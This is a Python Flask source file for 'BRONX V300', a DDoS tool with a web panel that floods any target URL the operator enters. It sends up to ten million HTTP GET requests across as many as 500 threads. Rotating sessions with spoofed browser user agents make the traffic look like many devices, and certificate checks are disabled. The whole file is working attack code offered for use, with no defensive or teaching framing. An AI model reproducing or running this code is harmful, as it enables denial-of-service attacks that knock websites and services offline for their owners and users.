from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import os

urllib3.disable_warnings()
app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# ========== GLOBAL STATS ==========
attack_stats = {"success": 0, "failed": 0, "total": 0}
total_lifetime = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
active_attacks = {}
multi_session_enabled = False
session_pool = []
attack_lock = threading.Lock()

# ========== CREATE SESSIONS (MULTI-DEVICE) ==========
def create_sessions(count=500):
    global session_pool
    session_pool = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    ]
    
    for i in range(count):
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        })
        session_pool.append(s)
    return len(session_pool)

# ========== DIRECT ATTACK WORKER (FAST) ==========
def attack_worker(attack_id, url, count, use_multi):
    success = 0
    failed = 0
    
    for _ in range(count):
        if attack_id not in active_attacks:
            break
        
        try:
            if use_multi and session_pool:
                session = random.choice(session_pool)
            else:
                session = requests.Session()
                session.headers.update({
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
                    ])
                })
            
            resp = session.get(url, timeout=10, verify=False, allow_redirects=True)
            
            if resp.status_code < 500:
                success += 1
            else:
                failed += 1
                
        except requests.exceptions.Timeout:
            failed += 1
        except requests.exceptions.ConnectionError:
            failed += 1
        except:
            failed += 1
    
    with attack_lock:
        attack_stats["success"] += success
        attack_stats["failed"] += failed
        attack_stats["total"] += (success + failed)
        total_lifetime["success"] += success
        total_lifetime["failed"] += failed
        total_lifetime["total"] += (success + failed)

def run_attack(attack_id, url, total_count, workers, use_multi):
    attack_logs.append(f"⚡ START: {url} | {total_count} REQ | {workers} WORKERS | MULTI: {'ON' if use_multi else 'OFF'}")
    
    per_worker = max(1, total_count // workers)
    extra = total_count - (per_worker * workers)
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        for _ in range(workers):
            futures.append(executor.submit(attack_worker, attack_id, url, per_worker, use_multi))
        if extra > 0:
            futures.append(executor.submit(attack_worker, attack_id, url, extra, use_multi))
        
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    attack_logs.append(f"✅ DONE: S:{attack_stats['success']} F:{attack_stats['failed']} T:{attack_stats['total']}")

# ========== HTML ==========
LOGIN_HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V300</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050010;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,rgba(255,0,85,0.08),transparent 60%),radial-gradient(ellipse at 80% 20%,rgba(0,200,255,0.05),transparent 50%);pointer-events:none;z-index:0}
.box{background:rgba(15,0,10,0.97);padding:50px 40px;border-radius:24px;border:2px solid rgba(255,0,85,0.2);width:430px;text-align:center;position:relative;z-index:1;box-shadow:0 0 100px rgba(255,0,85,0.15),0 0 200px rgba(255,215,0,0.05)}
.logo{font-size:4.5em;animation:pulse 1.5s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.15)}}
h1{font-size:2.4em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff,#fff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;margin:8px 0}
.tag{color:#ff0055;font-size:0.7em;letter-spacing:5px;text-transform:uppercase;margin:8px 0;animation:glow 1.5s infinite}@keyframes glow{50%{text-shadow:0 0 20px #ff0055,0 0 40px #ff0055,0 0 60px #ff0055}}
.info{color:#888;font-size:0.55em;letter-spacing:2px;margin:6px 0;line-height:1.5}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,0,85,0.2);border-radius:12px;color:#fff;margin:10px 0;font-size:15px;transition:0.3s}
input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.4);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:12px;font-weight:800;cursor:pointer;font-size:16px;margin-top:15px;letter-spacing:3px;transition:0.3s}
.btn:hover{box-shadow:0 0 60px rgba(255,0,85,0.8);transform:translateY(-3px)}
.btn:active{transform:scale(0.95)}
</style></head><body>
<div class="box"><div class="logo">💀</div><h1>BRONX V300</h1><div class="tag">ULTRA DODOS</div><div class="info">⚡ FLASH SPEED • MULTI-DEVICE • DIRECT HIT • 100% WORKING ⚡</div>
<form method="post"><input type="text" name="user" placeholder="USERNAME"><input type="password" name="pass" placeholder="PASSWORD"><button class="btn" type="submit">☠️ ACCESS PANEL</button></form>
{% if error %}<p style="color:#ff0055;margin-top:10px">{{ error }}</p>{% endif %}</div></body></html>"""

DASH_HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V300 PANEL</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050010;color:#e0e0e0;font-family:system-ui,sans-serif;padding:15px;min-height:100vh}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 50% 0%,rgba(255,0,85,0.05),transparent 60%),radial-gradient(ellipse at 80% 100%,rgba(0,200,255,0.03),transparent 50%);pointer-events:none;z-index:0}
.container{max-width:1400px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:18px 25px;border:1px solid rgba(255,0,85,0.2);border-radius:16px;margin-bottom:18px;background:rgba(255,0,85,0.03);flex-wrap:wrap;gap:12px;animation:headerGlow 3s infinite}@keyframes headerGlow{50%{border-color:rgba(255,0,85,0.5);box-shadow:0 0 40px rgba(255,0,85,0.15)}}
.header h1{font-size:1.8em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:18px}
.stat{background:rgba(255,0,85,0.03);border:1px solid rgba(255,0,85,0.12);border-radius:14px;padding:18px;text-align:center;transition:0.3s}
.stat:hover{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2)}
.stat-val{font-size:2.5em;font-weight:900}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}.b{color:#00c8ff}.w{color:#fff}
.stat-label{font-size:0.55em;text-transform:uppercase;letter-spacing:3px;color:#666;margin-top:4px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(420px,1fr));gap:14px;margin-bottom:18px}
.card{background:rgba(255,0,85,0.02);border:1px solid rgba(255,0,85,0.1);border-radius:14px;padding:22px}
.card h3{font-size:0.75em;font-weight:700;letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;color:#ff0055}
input,select,textarea{width:100%;padding:12px 14px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,0,85,0.12);border-radius:8px;color:#fff;margin:4px 0;font-size:13px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.2);outline:none}
label{font-size:0.6em;text-transform:uppercase;letter-spacing:2px;color:#888;display:block;margin-top:8px}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:0.75em;letter-spacing:2px;text-transform:uppercase;margin:5px 0;transition:0.3s}
.btn:hover{box-shadow:0 0 40px rgba(255,0,85,0.7);transform:translateY(-2px)}
.btn-red{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-red:hover{box-shadow:0 0 30px rgba(255,0,0,0.5)}
.btn-green{background:rgba(0,255,136,0.12);color:#00ff88;border:1px solid rgba(0,255,136,0.2)}.btn-green:hover{box-shadow:0 0 30px rgba(0,255,136,0.4)}
.btn-blue{background:rgba(0,200,255,0.12);color:#00c8ff;border:1px solid rgba(0,200,255,0.2)}
.btn-white{background:rgba(255,255,255,0.05);color:#fff;border:1px solid rgba(255,255,255,0.15)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
.logs{background:rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);border-radius:10px;padding:14px;max-height:300px;overflow:auto;font-size:0.65em;font-family:monospace;color:#00ff88}
.log-e{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.015);color:#888}
.badge{display:inline-block;padding:5px 14px;border-radius:20px;font-size:0.6em;letter-spacing:2px;text-transform:uppercase}
.badge-on{background:rgba(0,255,136,0.15);color:#00ff88;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.3}}
.badge-off{background:rgba(255,0,0,0.12);color:#ff4444}
.toggle-row{display:flex;align-items:center;gap:12px;margin:12px 0}
.toggle{width:50px;height:28px;background:rgba(255,255,255,0.06);border-radius:14px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#00ff88;box-shadow:0 0 25px rgba(0,255,136,0.4)}.toggle::after{content:'';position:absolute;top:3px;left:3px;width:22px;height:22px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:25px}
.ip-box{background:rgba(0,0,0,0.5);border:1px solid rgba(255,215,0,0.2);border-radius:8px;padding:10px;text-align:center;font-size:1.2em;color:#ffd700;font-weight:700;margin:8px 0;letter-spacing:2px}
.footer{text-align:center;padding:15px;color:rgba(255,255,255,0.1);font-size:0.55em;letter-spacing:3px}
</style></head><body>
<div class="container">
<div class="header"><div><h1>💀 BRONX V3.0</h1><div style="color:#888;font-size:0.5em;letter-spacing:2px">ULTIMATE DIRECT BOMBER • FLASH SPEED • MULTI-DEVICE</div></div>
<div style="display:flex;gap:10px;align-items:center"><span style="color:#666;font-size:0.6em" id="liveTime"></span><a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.6em;letter-spacing:2px">⏏️ LOGOUT</a></div></div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="succ">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="fail">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="tot">0</div><div class="stat-label">📊 TOTAL</div></div>
<div class="stat"><div class="stat-val b" id="asess">0</div><div class="stat-label">🔗 ACTIVE</div></div>
<div class="stat"><div class="stat-val w" id="sessCount">0</div><div class="stat-label">📱 SESSIONS</div></div>
</div>

<div class="grid">
<div class="card"><h3>🎯 ATTACK CONFIG</h3>
<label>TARGET URL</label><input type="text" id="url" placeholder="https://api.target.com/endpoint">
<div class="row-3"><div><label>REQUESTS</label><input type="number" id="count" value="50000"></div><div><label>WORKERS</label><input type="number" id="workers" value="200" min="10" max="500"></div><div><label>BATCH SIZE</label><input type="number" id="batch" value="1000" min="100"></div></div>
<button class="btn" onclick="startAttack()">🚀 LAUNCH ATTACK</button>
<button class="btn btn-red" onclick="stopAttack()">⏹️ STOP</button>
<button class="btn btn-white" onclick="resetStats()">🔄 RESET STATS</button>
<span id="status" style="margin-top:8px;display:block"></span>
</div>

<div class="card"><h3>🌐 YOUR INFO</h3>
<div class="ip-box" id="browserIP">Loading...</div>
<button class="btn btn-blue" onclick="copyIP()">📋 COPY IP</button>
</div>

<div class="card"><h3>🔗 MULTI-SESSION</h3>
<div class="toggle-row"><span style="color:#888;font-size:0.65em">MULTI-SESSION</span><div class="toggle" id="multiTog" onclick="toggleMulti()"></div><span id="multiLab" style="color:#888;font-size:0.65em">OFF</span></div>
<label>MAX SESSIONS (100-1000)</label><input type="number" id="maxSess" value="500" min="100" max="1000">
<button class="btn btn-green" onclick="saveMulti()">💾 CREATE SESSIONS</button>
<button class="btn btn-blue" onclick="resetSess()">🔄 RESET SESSIONS</button>
</div>
</div>

<div class="card"><h3>📜 ATTACK LOGS</h3>
<button class="btn btn-red" style="margin-bottom:8px" onclick="clearLogs()">🗑️ CLEAR LOGS</button>
<div class="logs" id="logs"><div class="log-e">💀 BRONX V300 ready. Configure and LAUNCH!</div></div></div>
<div class="footer">💀 BRONX V300 • ULTIMATE DIRECT BOMBER • FLASH SPEED • MULTI-DEVICE 💀</div></div>

<script>
var multiOn=false;
function toggleMulti(){multiOn=!multiOn;var t=document.getElementById('multiTog');t.classList.toggle('on',multiOn);var l=document.getElementById('multiLab');l.textContent=multiOn?'ON':'OFF';l.style.color=multiOn?'#00ff88':'#888'}
function saveMulti(){var max=document.getElementById('maxSess').value;fetch('/multi_config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,max:parseInt(max)})}).then(r=>r.json()).then(d=>{alert(d.status+' | Count: '+d.count);document.getElementById('sessCount').textContent=d.count})}
function resetSess(){fetch('/reset_sessions',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('sessCount').textContent=0;u()})}
function resetStats(){fetch('/reset_stats',{method:'POST'}).then(()=>u())}
function clearLogs(){fetch('/clear_logs',{method:'POST'}).then(()=>l())}
function copyIP(){var ip=document.getElementById('browserIP').textContent;navigator.clipboard.writeText(ip);alert('IP Copied: '+ip)}
function startAttack(){var url=document.getElementById('url').value.trim();var count=parseInt(document.getElementById('count').value);var workers=parseInt(document.getElementById('workers').value);if(!url){alert('Enter URL!');return};document.getElementById('status').innerHTML='<span class="badge badge-on">ACTIVE</span>';fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url,count:count,workers:workers,multi:multiOn})}).then(r=>r.json()).then(d=>{l();u()})}
function stopAttack(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span class="badge badge-off">STOPPED</span>';l()})}
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('succ').textContent=d.success;document.getElementById('fail').textContent=d.failed;document.getElementById('tot').textContent=d.total;document.getElementById('asess').textContent=d.active||0})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{document.getElementById('browserIP').textContent=d.ip})
setInterval(function(){l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1000)
</script></body></html>"""

# ========== ROUTES ==========
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN_HTML, error="ACCESS DENIED!")
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH_HTML)

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','').strip()
    count = min(int(d.get('count',1000)), 10000000)
    workers = min(int(d.get('workers',200)), 500)
    use_multi = d.get('multi',False)
    
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = str(int(time.time()*1000))
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack, args=(aid, url, count, workers, use_multi))
    t.daemon = True
    t.start()
    
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/reset_stats', methods=['POST'])
def reset_stats():
    with attack_lock:
        attack_stats["success"] = attack_stats["failed"] = attack_stats["total"] = 0
    return jsonify({"status":"reset"})

@app.route('/reset_sessions', methods=['POST'])
def reset_sessions():
    global session_pool
    session_pool = []
    return jsonify({"status":"reset"})

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    attack_logs.clear()
    return jsonify({"status":"cleared"})

@app.route('/multi_config', methods=['POST'])
def multi_config():
    global multi_session_enabled
    d = request.get_json()
    multi_session_enabled = d.get('enabled',False)
    max_sess = min(int(d.get('max',500)), 1000)
    
    if multi_session_enabled:
        count = create_sessions(max_sess)
        return jsonify({"status":"CREATED","count":count})
    return jsonify({"status":"DISABLED","count":0})

@app.route('/logs')
def logs():
    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats():
    return jsonify({**attack_stats, "active":len(active_attacks)})

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    port = int(os.environ.get('PORT',5000))
    print("💀 BRONX V300 ULTIMATE BOMBER READY!")
    print(f"⚡ Port: {port}")
    app.run(host='0.0.0.0', port=port, threaded=True)
